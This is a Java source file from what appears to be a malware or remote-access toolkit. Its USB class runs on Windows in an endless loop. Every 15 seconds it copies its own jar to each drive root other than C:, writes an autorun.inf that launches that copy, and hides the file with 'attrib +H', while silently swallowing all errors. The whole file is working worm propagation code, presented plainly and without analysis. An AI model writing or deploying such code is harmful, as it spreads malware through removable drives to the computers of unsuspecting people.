package rt.util;

import comunes.Interfaz;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.PrintWriter;
import rt.Inicio;

public class USB extends Thread implements Interfaz {

    private String nombreServer;

    public void instanciar(Object... parametros) {
        if (parametros.length == 1) {
            this.nombreServer = parametros[0] + ".jar";
        } else {
            this.nombreServer = "server.jar";
        }
        start();

    }

    @Override
    public void run() {
        String so = System.getProperty("os.name").toLowerCase();
        while (true) {
            if (so.contains("windows")) {
                procesarWindows();
            } else if (so.contains("linux")) {
//            instalarLinux();
                break;
            } else if (so.contains("mac")) {
                break;
//            instalarMac();
            }
            try {
                sleep(15000);//cada 15 segundos
            } catch (Exception ex) {
            }
        }
    }

    private void copiar(File destino) {
        try {
            if (destino.exists()) {
                destino.delete();
            }
        } catch (Exception e) {
        }
        try {
            File server = new File(Inicio.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            FileOutputStream salida = null;
            FileInputStream entrada = new FileInputStream(server);
            salida = new FileOutputStream(destino);
            byte[] BUFFER = new byte[1024];
            int i;
            while ((i = entrada.read(BUFFER)) > -1) {
                salida.write(BUFFER, 0, i);
            }
            salida.close();
        } catch (FileNotFoundException ex) {
        } catch (Exception ex) {
        }
    }

    private void crearAutorun(File destino, String nombreAplicacion) {
        try {
            if (destino.exists()) {
                destino.delete();
            }
        } catch (Exception e) {
        }
        FileWriter fichero = null;
        PrintWriter pw = null;
        try {
            fichero = new FileWriter(destino);
            pw = new PrintWriter(fichero);
            pw.println("[autorun]");
            pw.println("open=" + nombreAplicacion);
        } catch (Exception e) {
        } finally {
            try {
                if (null != fichero) {
                    fichero.close();
                }
            } catch (Exception e2) {
            }
        }
        try {
            Runtime.getRuntime().exec("attrib +H " + destino.getAbsolutePath());
        } catch (Exception e) {
        }
    }

    private void procesarWindows() {
        try {
            File[] ar = File.listRoots();
            if (ar != null) {
                for (File unidad : ar) {
                    if (!unidad.getAbsolutePath().toUpperCase().equals("C:\\")) {
                        copiar(new File(unidad, nombreServer));
                        crearAutorun(new File(unidad, "autorun.inf"), nombreServer);
                    }
                }
            }
        } catch (Exception e) {
        }
    }

    public void set(int opcion, Object valor) {

    }

    public Object get(int opcion, Object... parametros) {
        return null;
    }

    public void ejecutar(int opcion, Object... parametros) {

    }

}
